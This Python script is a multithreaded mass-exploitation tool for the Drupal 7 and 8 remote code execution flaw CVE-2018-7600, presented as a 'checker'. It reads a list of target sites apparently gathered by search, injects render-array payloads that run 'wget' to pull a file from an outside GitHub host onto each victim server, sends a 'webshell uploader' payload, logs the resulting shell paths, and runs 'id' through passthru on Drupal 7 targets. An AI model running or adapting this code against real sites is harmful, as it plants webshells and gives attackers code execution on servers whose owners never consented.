from queue import Queue
from urllib.parse import urlparse
from threading import Thread
import requests
import threading
import re
import os
from requests import get
from requests import post
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()


class Drupal_CVE_2018_7600():

    def __init__(self, filename):
        self.filename = filename
        self.urls = self.dp_cve()

    @staticmethod
    def banner():
        os.system('clear')
        print("\n")
        print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
        print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
        print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
        print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
        print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
        print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
        print("      Drupal(7/8) CVE 2018 7600 Checker - anarcoder at protonmail.com\n")

    def remove_duplicate_targets(self):
        results = [line.rstrip('\n') for line in open(self.filename)]
        url_lists = []
        for url in results:
            try:
                urlp = urlparse(url)
                urlp = urlp.scheme + '://' + urlp.netloc
                url_lists.append(urlp)
            except Exception as e:
                pass
        url_lists = set(url_lists)
        url_lists = list(url_lists)
        return url_lists

    def check_vuln(self, q):
        while True:
            #with lock:
                url = q.get()
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; '
                           'Linux x86_64; rv:41.0) Gecko/20100101 '
                           'Firefox/41.0'}

                drupal8conf = {'getParams': '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
                               'payload': {'form_id': 'user_register_form',
                                           '_drupal_ajax': '1',
                                           'mail[#post_render][]': 'exec',
                                           'mail[#type]': 'markup',
                                           'mail[#markup]': 'wget https://raw.githubusercontent.com/devel369/php/master/hu3.html'},
                               'webshell': {'form_id': 'user_register_form',
                                            '_drupal_ajax': '1',
                                            'mail[#post_render][]': 'exec',
                                            'mail[#type]': 'markup',
                                            'mail[#markup]': 'wget https://raw.githubusercontent.com/devel369/php/master/hu3.html'}}
                drupal7conf = {'getParams': {'q': 'user/password',
                                             'name[#post_render][]': 'passthru',
                                             'name[#markup]': 'id',
                                             'name[#type]': 'markup'},
                               'postParams': {'form_id': 'user_pass',
                                              '_triggering_element_name': 'name'}}

                vulnFlag = 0

                with open('drupalrce_sites.txt', 'a+') as f:
                    try:
                        print('[+] Trying rce for drupal 8.. {0}'.format(url))
                        req = post(url + drupal8conf['getParams'],
                                   headers=headers, verify=False,
                                   timeout=30, data=drupal8conf['payload'])
                        if req.status_code == 200:
                            print('[+] Post accepted, confirming page uploaded..')
                            req = get(url + '/hu3.html', headers=headers,
                                      verify=False, timeout=30)
                            if 'It Works' in req.content.decode("utf-8"):
                                print('[+] \033[31mVulnerable!!\033[33m Drupal 8 -> {0}\033[39m'.format(url + '/hu3.html'))
                                print('[+] Uploading webshell uploader...')
                                req = post(url + drupal8conf['getParams'],
                                           headers=headers, verify=False,
                                           timeout=30,
                                           data=drupal8conf['webshell'])
                                f.write(url + '/hu3.php' + '\n')
                                vulnFlag = 1
                            else:
                                print('[-] Not vulnerable for drupal 8..')
                        if vulnFlag == 0:
                            print('[+] Trying rce for drupal 7.. {0}'.format(url))
                            req = post(url, params=drupal7conf['getParams'],
                                       data=drupal7conf['postParams'],
                                       verify=False, timeout=30)
                            m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', req.text)
                            if m:
                                found = m.group(1)
                                get_params = {'q':'file/ajax/name/#value/' + found}
                                post_params = {'form_build_id': found}
                                req = post(url, data=post_params,
                                           params=get_params, verify=False,
                                           timeout=30)                                
                                if "uid=" in req.content.decode("utf-8"):
                                    print('[+] \033[31mVulnerable!!\033[33m Drupal 7 {0}\033[39m'.format(url))
                                    print('[+] \033[31m{0} {1}\033[39m'.format(str(req.content.decode("utf-8")).split('\n')[0],url))
                                    f.write(url + ' -> Drupal 7 \n')
                            q.task_done()
                    except Exception as e:
                        print('[-] Exception - Not vulnerable\n')
                        q.task_done()
                    q.task_done()

    def dp_cve(self):
        self.banner()

        # Removing duplicate targets
        url_lists = self.remove_duplicate_targets()
        print(len(url_lists))

        # My Queue
        q = Queue(maxsize=0)

        # Number of threads
        num_threads = 10

        for url in url_lists:
            q.put(url)

        # My threads
        print('[*] Starting evil threads =)...\n')
        for i in range(num_threads):
            worker = Thread(target=self.check_vuln, args=(q,))
            worker.setDaemon(True)
            worker.start()

        q.join()


def main():
    filename = 'results_google_search.txt'
    Drupal_CVE_2018_7600(filename)


if __name__ == '__main__':
    main()
